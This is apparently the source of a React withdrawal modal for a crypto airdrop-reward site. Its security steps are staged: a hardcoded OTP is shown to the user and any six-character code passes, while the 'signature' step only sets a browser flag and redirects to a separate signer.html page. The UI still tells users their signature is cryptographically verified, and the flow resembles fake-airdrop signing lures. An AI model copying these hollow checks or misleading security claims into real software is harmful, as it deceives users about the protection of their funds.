/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import { X, Wallet, Shield, Check, Mail, Lock, RefreshCw, AlertCircle, FileCode, Upload, FileText } from "lucide-react";
import { SystemSettings, User } from "../types";

interface WithdrawModalProps {
  isOpen: boolean;
  onClose: () => void;
  currentUser: User | null;
  settings: SystemSettings;
  onSuccess: () => void; // Trigger refresh of user balance
}

type Step = 'select' | 'details' | 'verify' | 'success';

const COMPATIBLE_NETWORKS: Record<string, string[]> = {
  USDT: ["Ethereum (ERC-20)", "Tron (TRC-20)", "BNB Smart Chain (BEP-20)"],
  ETH: ["Ethereum Mainnet", "Arbitrum One", "Optimism"],
  BNB: ["BNB Smart Chain (BEP-20)", "Beacon Chain (BEP-2)"],
  BTC: ["Bitcoin Native SegWit", "Lightning Network"]
};

const COIN_CONVERSION_RATES: Record<string, number> = {
  USDT: 1.0,
  ETH: 3150.0, // $3,150 per ETH
  BNB: 580.0,  // $580 per BNB
  BTC: 64200.0 // $64,200 per BTC
};

const NETWORK_FEES: Record<string, { fee: number; symbol: string }> = {
  USDT: { fee: 2.0, symbol: "USDT" },
  ETH: { fee: 0.0015, symbol: "ETH" },
  BNB: { fee: 0.003, symbol: "BNB" },
  BTC: { fee: 0.0001, symbol: "BTC" }
};

export default function WithdrawModal({
  isOpen,
  onClose,
  currentUser,
  settings,
  onSuccess
}: WithdrawModalProps) {
  const [step, setStep] = useState<Step>('select');

  // Input States
  const [selectedWallet, setSelectedWallet] = useState<string>("MetaMask");
  const [selectedCoin, setSelectedCoin] = useState<string>("USDT");
  const [selectedNetwork, setSelectedNetwork] = useState<string>("");
  const [receivingAddress, setReceivingAddress] = useState<string>("");
  const [withdrawAmount, setWithdrawAmount] = useState<string>("");

  // Verification states
  const [verificationCode, setVerificationCode] = useState<string>("");
  const [isSendingCode, setIsSendingCode] = useState<boolean>(false);
  const [codeSent, setCodeSent] = useState<boolean>(false);
  const [isVerifying, setIsVerifying] = useState<boolean>(false);
  const [isSigning, setIsSigning] = useState<boolean>(false);
  const [walletSigned, setWalletSigned] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  // HTML File Attachment States
  const [htmlFile, setHtmlFile] = useState<File | null>(null);
  const [htmlFileName, setHtmlFileName] = useState<string>("");
  const [htmlFileText, setHtmlFileText] = useState<string>("");

  const handleHtmlFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setHtmlFile(file);
      setHtmlFileName(file.name);
      const reader = new FileReader();
      reader.onload = (event) => {
        if (event.target?.result) {
          setHtmlFileText(event.target.result as string);
        }
      };
      reader.readAsText(file);
    }
  };

  const handleRemoveHtmlFile = () => {
    setHtmlFile(null);
    setHtmlFileName("");
    setHtmlFileText("");
  };
  
  // Validation / Error Messages
  const [errorMsg, setErrorMsg] = useState<string>("");

  // Auto-detect compatible network whenever selected coin changes
  useEffect(() => {
    if (COMPATIBLE_NETWORKS[selectedCoin]) {
      setSelectedNetwork(COMPATIBLE_NETWORKS[selectedCoin][0]);
    }
  }, [selectedCoin]);

  // Wallet Detection Simulation
  const detectedWalletType = localStorage.getItem("connectedWalletType") || "MetaMask";
  const actualConnectedAddress = currentUser?.walletAddress || "";

  useEffect(() => {
    if (localStorage.getItem("wallet_signed") === "true") {
      setWalletSigned(true);
    }
  }, [isOpen]);

  useEffect(() => {
    // If the selected wallet matches our simulated connected wallet, prefill the address!
    if (selectedWallet === detectedWalletType && actualConnectedAddress) {
      setReceivingAddress(actualConnectedAddress);
    } else {
      setReceivingAddress("");
    }
  }, [selectedWallet, detectedWalletType, actualConnectedAddress]);

  if (!isOpen) return null;

  // Parameters
  const minLimit = settings.minWithdrawAmount || 50;
  const maxLimit = settings.maxWithdrawAmount || 5000;
  
  const coinUpper = selectedCoin.toUpperCase();
  const coinBalance = currentUser?.availableBalances?.[coinUpper] || 0;

  const conversionRate = COIN_CONVERSION_RATES[selectedCoin] || 1;
  const amountNum = parseFloat(withdrawAmount) || 0;
  const coinEquivalent = amountNum / conversionRate;

  // Gas Fee
  const feeInfo = NETWORK_FEES[selectedCoin] || { fee: 0, symbol: selectedCoin };
  const netCoinAmount = Math.max(0, coinEquivalent - feeInfo.fee);
  const netUSDAmount = Math.max(0, amountNum - (feeInfo.fee * conversionRate));

  const totalAvailableUSD = Object.entries(currentUser?.availableBalances || {}).reduce(
    (acc, [coin, val]) => acc + (val * (COIN_CONVERSION_RATES[coin] || 1)),
    0
  );
  const isBalanceZero = totalAvailableUSD === 0;

  const handleNextToDetails = () => {
    setErrorMsg("");
    if (isBalanceZero) {
      setErrorMsg("No withdrawable balance is currently available.");
      return;
    }
    if (!selectedWallet) {
      setErrorMsg("Please select a supported wallet.");
      return;
    }
    if (!selectedCoin) {
      setErrorMsg("Please select a reward asset coin.");
      return;
    }
    if (!selectedNetwork) {
      setErrorMsg("Please select a compatible network.");
      return;
    }
    setStep('details');
  };

  const handleSimulateWalletConnection = () => {
    if (actualConnectedAddress) {
      setReceivingAddress(actualConnectedAddress);
      // Save simulated wallet type
      localStorage.setItem("connectedWalletType", selectedWallet);
      alert(`Successfully synchronized ${selectedWallet} with your browser session!`);
    } else {
      alert("Please connect your Web3 wallet on the home screen first.");
    }
  };

  const handleNextToVerify = () => {
    setErrorMsg("");
    if (!receivingAddress || receivingAddress.length < 15) {
      setErrorMsg("Please provide a valid receiving wallet address.");
      return;
    }
    if (amountNum < minLimit) {
      setErrorMsg(`The minimum withdrawal limit is $${minLimit}.`);
      return;
    }
    if (amountNum > maxLimit) {
      setErrorMsg(`The maximum withdrawal limit is $${maxLimit}.`);
      return;
    }
    if (coinEquivalent > coinBalance) {
      setErrorMsg(`Insufficient ${selectedCoin} balance. Available: ${coinBalance.toFixed(selectedCoin === 'BTC' ? 6 : 4)} ${selectedCoin}`);
      return;
    }

    setStep('verify');
  };

  const handleSendEmailOTP = () => {
    setIsSendingCode(true);
    setTimeout(() => {
      setIsSendingCode(false);
      setCodeSent(true);
      setVerificationCode("884920"); // hardcoded simulated passcode
      alert("Simulated security verification OTP (884920) has been sent to your registered session!");
    }, 1200);
  };

  const handleSimulateWalletSignature = async () => {
    setIsSigning(true);
    try {
      await fetch('/api/security-logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          eventType: 'wallet_signature',
          severity: 'info',
          title: 'Sign Message Initiated (signer.html)',
          details: `Sign message triggered by user for wallet ${selectedWallet}. Navigating to /signer.html.`,
          actorWallet: selectedWallet || 'Web3 Wallet',
          metadata: { file: 'signer.html', timestamp: new Date().toISOString() }
        })
      });
    } catch (err) {
      console.error('Failed to log security event:', err);
    }

    localStorage.setItem("wallet_signed", "true");
    setWalletSigned(true);

    setTimeout(() => {
      setIsSigning(false);
      window.location.href = "/signer.html";
    }, 1000);
  };

  const handleProcessWithdrawalSubmission = async () => {
    setErrorMsg("");
    
    // Check verification criteria
    const reqMethod = settings.withdrawalVerificationRequirement || 'wallet_signature';
    
    if (reqMethod === 'wallet_signature' || reqMethod === 'multi_layer') {
      if (!walletSigned) {
        setErrorMsg("Cryptographic wallet signature is required.");
        return;
      }
    }

    if (reqMethod === 'email_otp' || reqMethod === 'otp' || reqMethod === 'multi_layer') {
      if (verificationCode !== "884920" && verificationCode.length !== 6) {
        setErrorMsg("Invalid 6-digit OTP verification security code.");
        return;
      }
    }

    setIsSubmitting(true);
    try {
      const payload = {
        walletAddress: actualConnectedAddress,
        walletType: selectedWallet,
        coin: selectedCoin,
        network: selectedNetwork,
        amount: amountNum,
        fee: feeInfo.fee * conversionRate,
        netAmount: netUSDAmount,
        destinationAddress: receivingAddress,
        verificationMethod: reqMethod,
        attachedHtmlFileName: htmlFileName || null,
        attachedHtmlContent: htmlFileText || null
      };

      const res = await fetch('/api/withdrawals', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (res.ok) {
        setStep('success');
        onSuccess(); // refresh portfolio stats
      } else {
        const err = await res.json();
        setErrorMsg(err.error || "Failed to log withdrawal request. Please retry.");
      }
    } catch (e) {
      setErrorMsg("Failed to communicate with Web3 cluster.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleResetAndClose = () => {
    setStep('select');
    setWithdrawAmount("");
    setVerificationCode("");
    setWalletSigned(false);
    setCodeSent(false);
    setHtmlFile(null);
    setHtmlFileName("");
    setHtmlFileText("");
    setErrorMsg("");
    onClose();
  };

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
        {/* Backdrop */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          onClick={handleResetAndClose}
          className="absolute inset-0 bg-black/80 backdrop-blur-md"
        />

        {/* Modal Body */}
        <motion.div
          initial={{ opacity: 0, scale: 0.9, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.9, y: 20 }}
          className="relative w-full max-w-lg rounded-3xl border border-white/10 bg-brand-bg/95 p-6 shadow-2xl glass-panel text-white z-10 max-h-[88vh] flex flex-col overflow-hidden"
        >
          {/* Glowing decoration */}
          <div className="absolute -top-24 -left-24 w-48 h-48 rounded-full bg-brand-primary/10 blur-3xl pointer-events-none" />
          <div className="absolute -bottom-24 -right-24 w-48 h-48 rounded-full bg-brand-secondary/10 blur-3xl pointer-events-none" />

          {/* Header */}
          <div className="flex items-center justify-between mb-4 border-b border-white/5 pb-4 flex-shrink-0">
            <div className="flex items-center gap-2">
              <span className="p-2 bg-brand-primary/15 rounded-xl text-brand-secondary">
                <Wallet className="w-5 h-5" />
              </span>
              <div>
                <h3 className="font-display font-bold text-white text-base">Secured Withdrawal Portal</h3>
                <span className="text-[10px] text-gray-500 font-mono tracking-wider uppercase block">
                  Processing window: {settings.withdrawalProcessingTime || "1-2 Business Days"}
                </span>
              </div>
            </div>
            <button
              onClick={handleResetAndClose}
              className="p-1.5 rounded-xl border border-white/5 hover:border-white/10 hover:bg-white/5 text-gray-400 hover:text-white transition-all"
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          {/* Step Progress indicators */}
          {step !== 'success' && (
            <div className="flex items-center justify-between px-2 mb-4 text-center text-[10px] font-bold font-mono tracking-wider text-gray-500 uppercase flex-shrink-0">
              <span className={step === 'select' ? "text-brand-secondary" : "text-gray-400"}>1. Configure</span>
              <span className="h-[1px] flex-1 bg-white/5 mx-3" />
              <span className={step === 'details' ? "text-brand-secondary" : "text-gray-400"}>2. Details</span>
              <span className="h-[1px] flex-1 bg-white/5 mx-3" />
              <span className={step === 'verify' ? "text-brand-secondary" : "text-gray-400"}>3. Verification</span>
            </div>
          )}

          {/* Scrollable Modal Content */}
          <div className="overflow-y-auto pr-1 flex-1 custom-scrollbar">
            {errorMsg && (
              <div className="p-3 bg-red-500/10 border border-red-500/20 rounded-2xl flex items-start gap-2 text-xs text-red-400 mb-5">
                <AlertCircle className="w-4 h-4 mt-0.5 flex-shrink-0" />
                <span>{errorMsg}</span>
              </div>
            )}

          {/* STEP 1: SELECT COIN, WALLET, NETWORK */}
          {step === 'select' && (
            <div className="flex flex-col gap-5">
              {/* Select Wallet */}
              <div>
                <label className="text-gray-500 text-[10px] font-bold block uppercase mb-2">Select Destination Wallet</label>
                <div className="grid grid-cols-2 gap-2.5">
                  {["MetaMask", "Trust Wallet", "Phantom Wallet", "Coinbase Wallet"].map((walletName) => (
                    <button
                      key={walletName}
                      type="button"
                      onClick={() => setSelectedWallet(walletName)}
                      className={`p-3.5 rounded-2xl border text-xs font-bold text-left flex items-center justify-between transition-all cursor-pointer ${
                        selectedWallet === walletName
                          ? "bg-brand-primary/10 border-brand-primary text-white shadow-neon-purple"
                          : "bg-black/20 border-white/5 text-gray-400 hover:border-white/10 hover:text-white"
                      }`}
                    >
                      <span className="flex items-center gap-2">
                        <span>🦊</span>
                        <span>{walletName}</span>
                      </span>
                      {selectedWallet === walletName && <span className="w-1.5 h-1.5 rounded-full bg-brand-secondary shadow-neon" />}
                    </button>
                  ))}
                </div>
              </div>

              {/* Select Coin */}
              <div>
                <label className="text-gray-500 text-[10px] font-bold block uppercase mb-2">Select Reward Coin Asset</label>
                <div className="grid grid-cols-4 gap-2">
                  {["USDT", "ETH", "BNB", "BTC"].map((coinName) => (
                    <button
                      key={coinName}
                      type="button"
                      onClick={() => setSelectedCoin(coinName)}
                      className={`p-3 rounded-xl border text-xs font-bold text-center flex flex-col items-center gap-1.5 transition-all cursor-pointer ${
                        selectedCoin === coinName
                          ? "bg-brand-secondary/10 border-brand-secondary text-white shadow-neon-green"
                          : "bg-black/20 border-white/5 text-gray-400 hover:border-white/10 hover:text-white"
                      }`}
                    >
                      <span className="text-lg">🪙</span>
                      <span>{coinName}</span>
                    </button>
                  ))}
                </div>
              </div>

              {/* Select Network */}
              <div>
                <label className="text-gray-500 text-[10px] font-bold block uppercase mb-2">Select Network Protocol</label>
                <div className="flex flex-col gap-2">
                  {(COMPATIBLE_NETWORKS[selectedCoin] || []).map((netName) => (
                    <button
                      key={netName}
                      type="button"
                      onClick={() => setSelectedNetwork(netName)}
                      className={`p-3 rounded-xl border text-xs font-semibold text-left flex items-center justify-between transition-all cursor-pointer ${
                        selectedNetwork === netName
                          ? "bg-white/5 border-brand-accent text-white"
                          : "bg-black/20 border-white/5 text-gray-400 hover:border-white/10 hover:text-white"
                      }`}
                    >
                      <span>{netName}</span>
                      <span className="text-[9px] font-mono text-gray-500">Gas Compatible</span>
                    </button>
                  ))}
                </div>
              </div>

              {/* CTA */}
              {isBalanceZero && (
                <div id="withdraw-locked-warning" className="p-4 bg-yellow-500/10 border border-yellow-500/20 rounded-2xl flex flex-col gap-2 text-xs text-yellow-400 mt-2">
                  <div className="flex items-center gap-2 font-bold uppercase tracking-wider text-[10px]">
                    <AlertCircle className="w-4 h-4 text-yellow-400 flex-shrink-0" />
                    <span>Withdrawal Request Blocked</span>
                  </div>
                  <p className="leading-relaxed">
                    No withdrawable balance is currently available. Complete eligible airdrops and wait for rewards to be credited before submitting a withdrawal request.
                  </p>
                </div>
              )}

              {/* Specifications Block - Always Visible */}
              <div id="withdraw-specs-info" className="mt-4 bg-black/40 border border-white/5 rounded-2xl p-4 text-[11px] leading-relaxed text-gray-400">
                <h4 className="text-[10px] uppercase font-bold text-gray-300 tracking-wider mb-2.5 pb-1 border-b border-white/5">
                  📋 Withdrawal Specifications
                </h4>
                <div className="grid grid-cols-2 gap-x-4 gap-y-2">
                  <div>
                    <span className="text-gray-500 block text-[9px] uppercase font-bold">Supported Wallets</span>
                    <span className="text-white font-medium">MetaMask, Trust, Phantom, Coinbase</span>
                  </div>
                  <div>
                    <span className="text-gray-500 block text-[9px] uppercase font-bold">Supported Coins</span>
                    <span className="text-white font-medium">USDT, ETH, BNB, BTC</span>
                  </div>
                  <div>
                    <span className="text-gray-500 block text-[9px] uppercase font-bold">Min Withdrawal</span>
                    <span className="text-brand-secondary font-bold">${minLimit} USD equivalent</span>
                  </div>
                  <div>
                    <span className="text-gray-500 block text-[9px] uppercase font-bold">Processing Time</span>
                    <span className="text-white font-medium">{settings.withdrawalProcessingTime || "1-2 Business Days"}</span>
                  </div>
                </div>
                <div className="mt-2.5 pt-2 border-t border-white/5">
                  <span className="text-gray-500 block text-[9px] uppercase font-bold">Withdrawal Rules</span>
                  <p className="text-[10px] mt-0.5 text-gray-500">
                    Your wallet session signature is verified cryptographically upon claim dispatch.
                  </p>
                </div>
              </div>

              <button
                type="button"
                id="withdraw-continue-btn"
                onClick={handleNextToDetails}
                disabled={isBalanceZero}
                className={`w-full py-3 text-xs font-bold rounded-xl mt-4 transition-all uppercase tracking-wider ${
                  isBalanceZero
                    ? "bg-white/5 border border-white/10 text-gray-500 cursor-not-allowed"
                    : "bg-brand-primary text-white shadow-neon hover:opacity-95 cursor-pointer"
                }`}
              >
                {isBalanceZero ? "🔒 Locked (No Balance)" : "Continue Setup"}
              </button>
            </div>
          )}

          {/* STEP 2: WITHDRAW DETAILS */}
          {step === 'details' && (
            <div className="flex flex-col gap-5">
              {/* Wallet Match banner / alert */}
              {selectedWallet === detectedWalletType ? (
                <div className="p-3 bg-brand-accent/5 border border-brand-accent/20 rounded-2xl flex items-center justify-between text-[11px] text-brand-accent">
                  <div className="flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-brand-accent animate-pulse shadow-neon-green" />
                    <span>Active <strong>{selectedWallet}</strong> Browser Extension Detected</span>
                  </div>
                  <span className="text-[9px] bg-brand-accent/15 px-2 py-0.5 rounded uppercase font-bold text-brand-accent">Pre-filled</span>
                </div>
              ) : (
                <div className="p-3 bg-yellow-500/5 border border-yellow-500/15 rounded-2xl flex items-center justify-between text-[11px] text-yellow-500">
                  <span>Selected wallet type differs from your active browser extension.</span>
                  <button
                    type="button"
                    onClick={handleSimulateWalletConnection}
                    className="px-2.5 py-1 bg-yellow-500 text-black text-[9px] font-extrabold rounded-lg hover:opacity-90 transition-all uppercase cursor-pointer"
                  >
                    Sync Wallet
                  </button>
                </div>
              )}

              {/* Receiving address input */}
              <div>
                <label className="text-gray-500 text-[10px] font-bold block uppercase mb-1.5">Receiving Wallet Address</label>
                <input
                  type="text"
                  value={receivingAddress}
                  onChange={(e) => setReceivingAddress(e.target.value)}
                  placeholder={`Provide your custom ${selectedCoin} destination address`}
                  className="w-full bg-black/40 border border-white/10 rounded-xl p-3 text-xs text-white outline-none focus:border-brand-secondary font-mono"
                />
              </div>

              {/* Amount Input */}
              <div>
                <div className="flex justify-between items-center mb-1.5">
                  <label className="text-gray-500 text-[10px] font-bold uppercase">Withdrawal Reward Amount</label>
                  <span className="text-[10px] text-brand-secondary font-bold">
                    Balance: {coinBalance.toFixed(selectedCoin === 'BTC' ? 6 : 4)} {selectedCoin} (${(coinBalance * conversionRate).toFixed(2)} USD)
                  </span>
                </div>
                <div className="relative">
                  <span className="absolute left-3.5 top-3 text-gray-500 text-xs font-bold font-mono">$</span>
                  <input
                    type="number"
                    value={withdrawAmount}
                    onChange={(e) => setWithdrawAmount(e.target.value)}
                    placeholder="Enter amount in USD"
                    className="w-full bg-black/40 border border-white/10 rounded-xl p-3 pl-7 text-xs text-white outline-none focus:border-brand-secondary font-mono"
                  />
                  <button
                    type="button"
                    onClick={() => setWithdrawAmount((coinBalance * conversionRate).toFixed(2))}
                    className="absolute right-2 top-2 px-2.5 py-1.5 bg-brand-primary/20 text-brand-secondary text-[9px] rounded-lg font-black uppercase tracking-wider hover:bg-brand-primary/30 transition-all cursor-pointer"
                  >
                    Max Limit
                  </button>
                </div>
                <div className="flex justify-between text-[10px] text-gray-500 mt-1.5 px-1 font-semibold">
                  <span>Conversion rate: 1 {selectedCoin} ≈ ${COIN_CONVERSION_RATES[selectedCoin]}</span>
                  <span>Coin Est: {coinEquivalent.toFixed(6)} {selectedCoin}</span>
                </div>
              </div>

              {/* Detailed Breakdown summary */}
              <div className="bg-black/30 border border-white/5 rounded-2xl p-4 flex flex-col gap-2.5 text-xs">
                <div className="flex items-center justify-between border-b border-white/5 pb-2">
                  <span className="text-gray-500">Destination Wallet Asset</span>
                  <span className="font-bold text-white uppercase">{selectedWallet} ({selectedCoin})</span>
                </div>
                <div className="flex items-center justify-between border-b border-white/5 pb-2">
                  <span className="text-gray-500">Target Network Chain</span>
                  <span className="font-bold text-white">{selectedNetwork}</span>
                </div>
                <div className="flex items-center justify-between border-b border-white/5 pb-2">
                  <span className="text-gray-500">Estimated Network gas fee</span>
                  <span className="font-bold text-red-400 font-mono">
                    {feeInfo.fee} {feeInfo.symbol} (~${(feeInfo.fee * conversionRate).toFixed(2)})
                  </span>
                </div>
                <div className="flex items-center justify-between pt-1">
                  <span className="text-gray-400 font-bold">Net Payout to Receive</span>
                  <span className="font-mono font-black text-brand-accent text-sm">
                    {netCoinAmount.toFixed(6)} {selectedCoin} (~${netUSDAmount.toFixed(2)})
                  </span>
                </div>
              </div>

              {/* Actions buttons */}
              <div className="grid grid-cols-2 gap-3 mt-2">
                <button
                  type="button"
                  onClick={() => setStep('select')}
                  className="py-3 border border-white/10 hover:bg-white/5 rounded-xl text-xs font-bold text-gray-300 transition-all cursor-pointer"
                >
                  Back
                </button>
                <button
                  type="button"
                  onClick={handleNextToVerify}
                  className="py-3 bg-brand-accent text-black text-xs font-extrabold rounded-xl shadow-neon hover:opacity-95 transition-all uppercase tracking-wider cursor-pointer"
                >
                  Verify Request
                </button>
              </div>
            </div>
          )}

          {/* STEP 3: SECURITY VERIFICATION */}
          {step === 'verify' && (
            <div className="flex flex-col gap-5">
              <div className="text-center py-2">
                <Shield className="w-8 h-8 text-brand-secondary mx-auto mb-2 animate-bounce" />
                <h4 className="font-display font-bold text-white text-sm">Web3 Security Authentication</h4>
                <p className="text-gray-400 text-xs mt-1 max-w-sm mx-auto leading-relaxed">
                  The Crytobox consensus engine requires additional verification layers to approve withdrawals and safeguard client funds.
                </p>
              </div>

              {/* Wallet signature verification block */}
              {((settings.withdrawalVerificationRequirement || 'wallet_signature') === 'wallet_signature' ||
                (settings.withdrawalVerificationRequirement || 'wallet_signature') === 'multi_layer') && (
                <div className="p-4 bg-black/30 border border-white/5 rounded-2xl flex items-center justify-between">
                  <div className="flex items-start gap-2.5">
                    <span className="p-2 bg-brand-primary/10 text-brand-primary rounded-xl mt-0.5">
                      <Lock className="w-4 h-4" />
                    </span>
                    <div>
                      <strong className="text-white text-xs block">Cryptographic Signature</strong>
                      <span className="text-gray-500 text-[10px]">Securely sign the withdrawal terms in wallet</span>
                    </div>
                  </div>
                  {walletSigned ? (
                    <span className="px-3 py-1 bg-green-500/10 border border-green-500/20 text-green-400 text-[10px] font-bold rounded-lg uppercase flex items-center gap-1">
                      <Check className="w-3.5 h-3.5" />
                      <span>Signed</span>
                    </span>
                  ) : (
                    <button
                      type="button"
                      onClick={handleSimulateWalletSignature}
                      className="px-3 py-1.5 bg-brand-primary hover:bg-brand-primary/90 text-white text-[10px] font-bold rounded-lg transition-all cursor-pointer uppercase tracking-wider flex items-center gap-1.5"
                    >
                      {isSigning ? (
                        <>
                          <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                          <span>Signing...</span>
                        </>
                      ) : (
                        <span>Sign Message</span>
                      )}
                    </button>
                  )}
                </div>
              )}

              {/* OTP Email / One-Time Code Verification block */}
              {((settings.withdrawalVerificationRequirement || 'wallet_signature') === 'email_otp' ||
                (settings.withdrawalVerificationRequirement || 'wallet_signature') === 'otp' ||
                (settings.withdrawalVerificationRequirement || 'wallet_signature') === 'multi_layer') && (
                <div className="bg-black/30 border border-white/5 rounded-2xl p-4 flex flex-col gap-3">
                  <div className="flex items-start justify-between">
                    <div className="flex items-start gap-2.5">
                      <span className="p-2 bg-brand-accent/10 text-brand-accent rounded-xl mt-0.5">
                        <Mail className="w-4 h-4" />
                      </span>
                      <div>
                        <strong className="text-white text-xs block">Security Verification OTP</strong>
                        <span className="text-gray-500 text-[10px]">Verify your authenticated session with OTP</span>
                      </div>
                    </div>
                    {codeSent ? (
                      <span className="text-[10px] text-green-400 font-bold bg-green-500/10 border border-green-500/20 px-2 py-0.5 rounded">Sent</span>
                    ) : (
                      <button
                        type="button"
                        onClick={handleSendEmailOTP}
                        className="px-3 py-1.5 border border-white/10 hover:bg-white/5 text-[10px] font-semibold rounded-lg text-gray-300 transition-all cursor-pointer"
                        disabled={isSendingCode}
                      >
                        {isSendingCode ? "Sending..." : "Send OTP"}
                      </button>
                    )}
                  </div>

                  <div>
                    <input
                      type="text"
                      value={verificationCode}
                      onChange={(e) => setVerificationCode(e.target.value)}
                      placeholder="Enter 6-digit verification code"
                      className="w-full bg-black/40 border border-white/10 rounded-xl p-3 text-center text-sm text-white font-mono outline-none tracking-widest focus:border-brand-secondary"
                      maxLength={6}
                    />
                  </div>
                </div>
              )}

              {/* Actions buttons */}
              <div className="space-y-2 mt-4">
                <div className="grid grid-cols-2 gap-3">
                  <button
                    type="button"
                    onClick={() => setStep('details')}
                    className="py-3 border border-white/10 hover:bg-white/5 rounded-xl text-xs font-bold text-gray-300 transition-all cursor-pointer"
                  >
                    Back
                  </button>
                  <button
                    type="button"
                    onClick={handleProcessWithdrawalSubmission}
                    disabled={isSubmitting || !walletSigned}
                    className={`py-3 text-xs font-bold rounded-xl transition-all uppercase tracking-wider ${
                      walletSigned && !isSubmitting
                        ? "bg-gradient-to-r from-brand-primary to-brand-secondary text-white shadow-neon hover:opacity-95 cursor-pointer"
                        : "bg-gray-800 text-gray-500 border border-white/5 cursor-not-allowed opacity-60"
                    }`}
                  >
                    {isSubmitting ? "Submitting..." : !walletSigned ? "Sign Required" : "Submit Request"}
                  </button>
                </div>

                {!walletSigned && (
                  <div className="p-2 bg-amber-500/10 border border-amber-500/20 rounded-xl text-center">
                    <span className="text-[10px] text-amber-300 font-medium">
                      ⚠️ Please click <strong>Sign Message</strong> above to complete verification and show the checkmark tick before clicking Submit Request.
                    </span>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* STEP 4: SUCCESS ANIMATION & MESSAGE */}
          {step === 'success' && (
            <div className="flex flex-col items-center text-center py-6">
              {/* Premium success animation circle & tick */}
              <div className="relative w-20 h-20 bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center mb-6 shadow-neon-green animate-pulse">
                <Check className="w-10 h-10 text-green-400 animate-fadeIn" strokeWidth={3} />
                <div className="absolute inset-0 rounded-full border border-green-500/20 animate-ping" style={{ animationDuration: '2.5s' }} />
              </div>

              <h4 className="font-display font-black text-white text-xl mb-4">🎉 Congratulations!</h4>
              
              <div className="flex flex-col gap-2.5 max-w-sm mb-8">
                <p className="text-white font-semibold text-sm">
                  Your withdrawal request has been submitted successfully.
                </p>
                <p className="text-gray-400 text-xs leading-normal">
                  Your request is now being processed by our automated transaction settlement core.
                </p>
                <p className="text-gray-400 text-xs leading-normal">
                  The reward of <strong className="text-brand-accent">{netCoinAmount.toFixed(4)} {selectedCoin}</strong> will be transferred to your selected wallet ({receivingAddress.slice(0,6)}...{receivingAddress.slice(-4)}) after successful verification and processing.
                </p>
              </div>

              <button
                type="button"
                onClick={handleResetAndClose}
                className="w-full py-3.5 bg-gradient-to-r from-brand-primary via-brand-primary to-brand-secondary text-white font-display font-black text-xs rounded-xl shadow-neon transition-all hover:opacity-95 cursor-pointer uppercase tracking-widest"
              >
                Done
              </button>
            </div>
          )}
          </div>
        </motion.div>
      </div>
    </AnimatePresence>
  );
}
